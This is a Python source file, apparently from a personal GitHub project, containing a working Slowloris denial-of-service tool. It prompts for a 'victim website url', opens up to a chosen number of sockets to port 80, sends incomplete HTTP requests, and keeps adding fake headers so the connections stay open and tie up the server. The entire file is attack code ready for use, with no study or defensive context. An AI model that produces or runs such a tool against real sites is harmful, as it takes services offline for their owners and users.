# Made by wdhg
# www.github.com/wdhg

import socket
from random import randint
from time import sleep

message = """

 ___| | _____      _| | ___  _ __(_)___    __ _| |_| |_ __ _  ___| | __
/ __| |/ _ \ \ /\ / / |/ _ \| '__| / __|  / _` | __| __/ _` |/ __| |/ /
\__ \ | (_) \ V  V /| | (_) | |  | \__ \ | (_| | |_| || (_| | (__|   <
|___/_|\___/ \_/\_/ |_|\___/|_|  |_|___/  \__,_|\__|\__\__,_|\___|_|\_\\

 """

REGULAR_HEADERS = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

class Sock(socket.socket):
    def __init__(self, target):
        try:
            super(Sock, self).__init__()
            self.settimeout(4)
            self.connect((target, 80))
            self.send(("Get /?%s HTTP/1.1\r\n" % randint(0, 2000)).encode("UTF-8"))
            for header in REGULAR_HEADERS:
                self.send(("%s\r\n" % header).encode("UTF-8"))
        except:
            print("Error making socket")
            pass

    def keep_alive(self, list_of_sockets):
        try:
            self.send(("X-a: %s\r\n" % randint(0, 5000)).encode("UTF-8"))
        except socket.error:
            self.close()
            list_of_sockets.remove(self)

def recreate_sockets(list_of_sockets, max_sockets, target):
    for index in range(max_sockets - len(list_of_sockets)):
        list_of_sockets.append(Sock(target))

def attack(list_of_sockets, max_sockets, target):
    while True:
        print("-----Attacking %s with %s sockets-----" %(target, len(list_of_sockets))) # Printing this every time just in case some sockets die or are made
        for sock in list_of_sockets:
            try:
                sock.keep_alive(list_of_sockets)
            except socket.error():
                print("Error keeping alive")
                pass
        recreate_sockets(list_of_sockets, max_sockets, target)
        sleep(15)

def make_sockets(max_sockets, target):
    print("Making sockets...")
    list_of_sockets = []
    for index in range(max_sockets):
        try:
            list_of_sockets.append(Sock(target))
            print("Socket successfully made [%s]" % str(index))
        except Exception as exception:
            print(exception)
            print("Error making socket")
            pass
    return list_of_sockets

def main():
    print(message)
    target = input("Enter victim website url: ") # The target website for the attack
    try:
        max_sockets = int(input("Enter the max number of sockets (Try 200 if unsure): ")) # The max number of sockets that will be made.
    except:
        print("Error: Max number of sockets is invalid")
        return
    list_of_sockets = make_sockets(max_sockets, target)
    attack(list_of_sockets, max_sockets, target)

if __name__ == "__main__":
    main()
